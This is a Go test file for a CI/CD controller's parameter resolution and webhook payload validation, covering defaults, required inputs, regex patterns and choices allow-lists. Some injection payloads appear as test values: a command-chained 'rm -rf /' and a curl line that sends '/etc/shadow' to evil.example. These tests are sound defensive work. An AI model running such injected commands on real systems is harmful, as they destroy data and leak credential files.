package controller

import (
	"testing"

	"github.com/eirueimi/unified-cd/internal/dsl"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestResolveParams_MissingRequired_Errors(t *testing.T) {
	inputs := []dsl.Input{
		{Name: "image", Type: "string", Required: true},
	}
	_, err := resolveParams(inputs, map[string]string{})
	require.Error(t, err)
	assert.Contains(t, err.Error(), "image")
}

func TestResolveParams_MissingRequired_MultipleNamesAllListed(t *testing.T) {
	inputs := []dsl.Input{
		{Name: "image", Type: "string", Required: true},
		{Name: "tag", Type: "string", Required: true},
	}
	_, err := resolveParams(inputs, map[string]string{})
	require.Error(t, err)
	assert.Contains(t, err.Error(), "image")
	assert.Contains(t, err.Error(), "tag")
}

func TestResolveParams_OmittedWithDefault_Filled(t *testing.T) {
	inputs := []dsl.Input{
		{Name: "tag", Type: "string", Default: "latest"},
	}
	got, err := resolveParams(inputs, map[string]string{})
	require.NoError(t, err)
	assert.Equal(t, "latest", got["tag"])
}

func TestResolveParams_ExplicitEmptyValue_FallsBackToDefault(t *testing.T) {
	// An explicit `working_dir: ""` must not bypass the declared default; it should
	// fall back to the default just like an omitted param.
	inputs := []dsl.Input{
		{Name: "working_dir", Type: "string", Default: "/src"},
	}
	got, err := resolveParams(inputs, map[string]string{"working_dir": ""})
	require.NoError(t, err)
	assert.Equal(t, "/src", got["working_dir"])
}

func TestResolveParams_ExplicitEmptyValue_NoDefault_KeptEmpty(t *testing.T) {
	// With no declared default there is nothing to fall back to, so an explicit
	// empty value is preserved as-is (and does not error for a non-required param).
	inputs := []dsl.Input{
		{Name: "note", Type: "string"},
	}
	got, err := resolveParams(inputs, map[string]string{"note": ""})
	require.NoError(t, err)
	assert.Equal(t, "", got["note"])
}

func TestResolveParams_ExplicitEmptyValue_RequiredNoDefault_Errors(t *testing.T) {
	// An explicit empty value for a required param with no default is treated as
	// unset, so it errors like an omitted required param.
	inputs := []dsl.Input{
		{Name: "image", Type: "string", Required: true},
	}
	_, err := resolveParams(inputs, map[string]string{"image": ""})
	require.Error(t, err)
	assert.Contains(t, err.Error(), "image")
}

func TestResolveParams_ProvidedValue_Unchanged(t *testing.T) {
	inputs := []dsl.Input{
		{Name: "tag", Type: "string", Default: "latest"},
	}
	got, err := resolveParams(inputs, map[string]string{"tag": "v2"})
	require.NoError(t, err)
	assert.Equal(t, "v2", got["tag"])
}

func TestResolveParams_RequiredWithDefault_NoErrorWhenOmitted(t *testing.T) {
	// A default satisfies the required constraint even when the caller omits it.
	inputs := []dsl.Input{
		{Name: "env", Type: "string", Required: true, Default: "staging"},
	}
	got, err := resolveParams(inputs, map[string]string{})
	require.NoError(t, err)
	assert.Equal(t, "staging", got["env"])
}

func TestResolveParams_NonBoolDefault_FormattedAsString(t *testing.T) {
	inputs := []dsl.Input{
		{Name: "run_tests", Type: "bool", Default: true},
	}
	got, err := resolveParams(inputs, map[string]string{})
	require.NoError(t, err)
	assert.Equal(t, "true", got["run_tests"])
}

func TestResolveParams_UndeclaredParams_PassThrough(t *testing.T) {
	got, err := resolveParams(nil, map[string]string{"extra": "value"})
	require.NoError(t, err)
	assert.Equal(t, "value", got["extra"])
}

func TestResolveParams_NoInputs_ReturnsSuppliedUnchanged(t *testing.T) {
	got, err := resolveParams(nil, map[string]string{"k": "v"})
	require.NoError(t, err)
	assert.Equal(t, map[string]string{"k": "v"}, got)
}

func TestResolveParams_DoesNotMutateSuppliedMap(t *testing.T) {
	inputs := []dsl.Input{
		{Name: "tag", Type: "string", Default: "latest"},
	}
	supplied := map[string]string{}
	_, err := resolveParams(inputs, supplied)
	require.NoError(t, err)
	assert.Empty(t, supplied, "resolveParams must not mutate the caller's map")
}

func TestResolveParams_EnforcesPattern(t *testing.T) {
	inputs := []dsl.Input{{Name: "ref", Type: "string", Pattern: `^[A-Za-z0-9._/-]+$`}}

	_, err := resolveParams(inputs, map[string]string{"ref": "main; rm -rf /"})
	require.Error(t, err, "a value with shell metacharacters must be rejected")
	assert.Contains(t, err.Error(), "ref")

	got, err := resolveParams(inputs, map[string]string{"ref": "refs/heads/main"})
	require.NoError(t, err)
	assert.Equal(t, "refs/heads/main", got["ref"])
}

func TestResolveParams_InvalidPatternIsAnError(t *testing.T) {
	inputs := []dsl.Input{{Name: "ref", Type: "string", Pattern: "([unclosed"}}
	_, err := resolveParams(inputs, map[string]string{"ref": "x"})
	require.Error(t, err, "a malformed pattern must fail loudly, not silently allow everything")
}

func TestResolveParams_NoPatternStillWorks(t *testing.T) {
	inputs := []dsl.Input{{Name: "msg", Type: "string"}}
	got, err := resolveParams(inputs, map[string]string{"msg": "anything goes"})
	require.NoError(t, err)
	assert.Equal(t, "anything goes", got["msg"])
}

func TestResolveParams_PatternAppliesToDefault(t *testing.T) {
	// A bad default must not slip through unvalidated.
	inputs := []dsl.Input{{Name: "env", Type: "string", Default: "staging;rm -rf /", Pattern: `^[A-Za-z0-9._/-]+$`}}
	_, err := resolveParams(inputs, map[string]string{})
	require.Error(t, err)
	assert.Contains(t, err.Error(), "env")
}

func TestResolveParams_ErrorDoesNotEchoRejectedValue(t *testing.T) {
	// The rejected value may itself carry an injection payload; it must not be
	// echoed into an operator-read error message.
	inputs := []dsl.Input{{Name: "ref", Type: "string", Pattern: `^[A-Za-z0-9._/-]+$`}}
	secretPayload := "main; curl evil.example/$(cat /etc/shadow)"
	_, err := resolveParams(inputs, map[string]string{"ref": secretPayload})
	require.Error(t, err)
	assert.NotContains(t, err.Error(), secretPayload)
}

func TestResolveParams_Choices_ValueInChoices_Unchanged(t *testing.T) {
	inputs := []dsl.Input{{Name: "env", Type: "string", Choices: []string{"staging", "prod"}}}
	got, err := resolveParams(inputs, map[string]string{"env": "prod"})
	require.NoError(t, err)
	assert.Equal(t, "prod", got["env"])
}

func TestResolveParams_Choices_ValueNotInChoices_ErrorsNamingAllowedValues(t *testing.T) {
	inputs := []dsl.Input{{Name: "env", Type: "string", Choices: []string{"staging", "prod"}}}
	_, err := resolveParams(inputs, map[string]string{"env": "dev"})
	require.Error(t, err)
	assert.Contains(t, err.Error(), "env")
	assert.Contains(t, err.Error(), "staging")
	assert.Contains(t, err.Error(), "prod")
}

func TestResolveParams_Choices_SuppliedValueNotInChoices_RejectedEvenWithDefault(t *testing.T) {
	// Supplied wins over default, same as today — but the supplied value must
	// still be validated against choices.
	inputs := []dsl.Input{{Name: "env", Type: "string", Default: "staging", Choices: []string{"staging", "prod"}}}
	_, err := resolveParams(inputs, map[string]string{"env": "dev"})
	require.Error(t, err)
	assert.Contains(t, err.Error(), "staging")
	assert.Contains(t, err.Error(), "prod")
}

func TestResolveParams_Choices_DefaultFilledIn_PassesValidation(t *testing.T) {
	// Parse-time already guarantees default is a member of choices; this
	// proves it end-to-end through resolveParams.
	inputs := []dsl.Input{{Name: "env", Type: "string", Default: "staging", Choices: []string{"staging", "prod"}}}
	got, err := resolveParams(inputs, map[string]string{})
	require.NoError(t, err)
	assert.Equal(t, "staging", got["env"])
}

func TestResolveParams_Choices_OmittedOptional_NoErrorNoValueInjected(t *testing.T) {
	// Not required, no default: an omitted choices param resolves with no
	// error and no value is injected into the map.
	inputs := []dsl.Input{{Name: "env", Type: "string", Choices: []string{"staging", "prod"}}}
	got, err := resolveParams(inputs, map[string]string{})
	require.NoError(t, err)
	_, present := got["env"]
	assert.False(t, present, "no value should be injected for an omitted optional choices param")
}

func TestResolveParams_Choices_ExplicitEmptyString_OptionalNoDefault_KeptEmptyNoError(t *testing.T) {
	// The Web UI's <select> represents "no selection" as "". This codebase
	// already treats "" as "unset" for defaulting purposes (see
	// TestResolveParams_ExplicitEmptyValue_NoDefault_KeptEmpty). Choices must
	// skip validation for "" the same way, even though "" IS present in the
	// map (ok == true) — unlike the Pattern loop, which still checks "".
	inputs := []dsl.Input{{Name: "env", Type: "string", Choices: []string{"staging", "prod"}}}
	got, err := resolveParams(inputs, map[string]string{"env": ""})
	require.NoError(t, err)
	assert.Equal(t, "", got["env"])
}

func TestResolveParams_Choices_RequiredNoValue_ErrorsViaMissingRequiredPath(t *testing.T) {
	// A required choices param with no supplied value and no default is
	// caught by the existing missing-required check, before the choices loop
	// ever runs — not a new "not one of" error.
	inputs := []dsl.Input{{Name: "env", Type: "string", Required: true, Choices: []string{"staging", "prod"}}}
	_, err := resolveParams(inputs, map[string]string{})
	require.Error(t, err)
	assert.Equal(t, "missing required param: env", err.Error())
}

func TestValidateWebhookPayloadMappedParams_RejectsUndeclaredInput(t *testing.T) {
	mapping := map[string]string{"ref": `{{ index .Payload "ref" }}`}
	err := validateWebhookPayloadMappedParams("wh", mapping, nil, "build")
	require.Error(t, err)
	assert.Contains(t, err.Error(), `"wh"`)
	assert.Contains(t, err.Error(), `"ref"`)
	assert.Contains(t, err.Error(), `"build"`)
}

func TestValidateWebhookPayloadMappedParams_RejectsInputWithoutPatternOrUnvalidated(t *testing.T) {
	mapping := map[string]string{"ref": `{{ .Payload.ref }}`}
	inputs := []dsl.Input{{Name: "ref", Type: "string"}}
	err := validateWebhookPayloadMappedParams("wh", mapping, inputs, "build")
	require.Error(t, err)
}

func TestValidateWebhookPayloadMappedParams_AllowsDeclaredPattern(t *testing.T) {
	mapping := map[string]string{"ref": `{{ .Payload.ref }}`}
	inputs := []dsl.Input{{Name: "ref", Type: "string", Pattern: `^[A-Za-z0-9._/-]+$`}}
	require.NoError(t, validateWebhookPayloadMappedParams("wh", mapping, inputs, "build"))
}

func TestValidateWebhookPayloadMappedParams_AllowsExplicitUnvalidated(t *testing.T) {
	mapping := map[string]string{"message": `{{ .Payload.message }}`}
	inputs := []dsl.Input{{Name: "message", Type: "string", Unvalidated: true}}
	require.NoError(t, validateWebhookPayloadMappedParams("wh", mapping, inputs, "build"))
}

func TestValidateWebhookPayloadMappedParams_RejectsHeadersWithoutPatternOrUnvalidated(t *testing.T) {
	// .Headers is not yet implemented, but the guard must fail-safe in advance:
	// if it is ever added, mappings using it require pattern: or unvalidated: true
	// to be explicit about accepting attacker-controlled data.
	mapping := map[string]string{"custom_header": `{{ .Headers.X-Custom-Ref }}`}
	inputs := []dsl.Input{{Name: "custom_header", Type: "string"}}
	err := validateWebhookPayloadMappedParams("wh", mapping, inputs, "build")
	require.Error(t, err)
	assert.Contains(t, err.Error(), `"wh"`)
	assert.Contains(t, err.Error(), `"custom_header"`)
	assert.Contains(t, err.Error(), `"build"`)
}

func TestValidateWebhookPayloadMappedParams_RejectsDotFormWithoutPatternOrUnvalidated(t *testing.T) {
	// {{ . }} renders WebhookTemplateData's entire (attacker-controlled)
	// Payload field without containing the substring ".Payload" anywhere in
	// the template text — the fail-open bypass the reviewer found empirically
	// (tpl="{{ . }}" rendered the full payload map). The positive "{{"
	// check must catch this even though no enumerated substring matches.
	mapping := map[string]string{"raw": `{{ . }}`}
	inputs := []dsl.Input{{Name: "raw", Type: "string"}}
	err := validateWebhookPayloadMappedParams("wh", mapping, inputs, "build")
	require.Error(t, err)
	assert.Contains(t, err.Error(), `"wh"`)
	assert.Contains(t, err.Error(), `"raw"`)
	assert.Contains(t, err.Error(), `"build"`)
}

func TestValidateWebhookPayloadMappedParams_RejectsDollarFormWithoutPatternOrUnvalidated(t *testing.T) {
	// {{ $ }} is the same whole-payload bypass as {{ . }}, via the root
	// template variable instead of dot.
	mapping := map[string]string{"raw": `{{ $ }}`}
	inputs := []dsl.Input{{Name: "raw", Type: "string"}}
	err := validateWebhookPayloadMappedParams("wh", mapping, inputs, "build")
	require.Error(t, err)
}

func TestValidateWebhookPayloadMappedParams_DotFormWithPatternPasses(t *testing.T) {
	// A pattern: still lets a {{ . }}-style mapping through — the guard cares
	// only about whether the resolved value is validated, not the specific
	// template syntax used to produce it.
	mapping := map[string]string{"raw": `{{ . }}`}
	inputs := []dsl.Input{{Name: "raw", Type: "string", Pattern: `^[A-Za-z0-9._/-]+$`}}
	require.NoError(t, validateWebhookPayloadMappedParams("wh", mapping, inputs, "build"))
}

func TestValidateWebhookPayloadMappedParams_IgnoresLiteralMapping(t *testing.T) {
	// A mapping that never reads .Payload is author-controlled (set directly
	// in the receiver's YAML), not attacker-controlled, so it is not subject
	// to this check even if the job declares no pattern for it.
	mapping := map[string]string{"image": "myapp"}
	require.NoError(t, validateWebhookPayloadMappedParams("wh", mapping, nil, "build"))
}

func TestValidateWebhookPayloadMappedParams_AllowsDeclaredChoices(t *testing.T) {
	// A choices: allow-list, with no pattern:, satisfies the gate on its own:
	// it is a strict allow-list, strictly stronger than any pattern: regex.
	mapping := map[string]string{"env": `{{ .Payload.env }}`}
	inputs := []dsl.Input{{Name: "env", Type: "string", Choices: []string{"staging", "prod"}}}
	require.NoError(t, validateWebhookPayloadMappedParams("wh", mapping, inputs, "build"))
}

func TestValidateWebhookPayloadMappedParams_ErrorMentionsChoicesAsAnOption(t *testing.T) {
	// When none of pattern/unvalidated/choices is declared, the error message
	// must mention choices: as a way to satisfy the gate.
	mapping := map[string]string{"env": `{{ .Payload.env }}`}
	inputs := []dsl.Input{{Name: "env", Type: "string"}}
	err := validateWebhookPayloadMappedParams("wh", mapping, inputs, "build")
	require.Error(t, err)
	assert.Contains(t, err.Error(), "choices:")
}
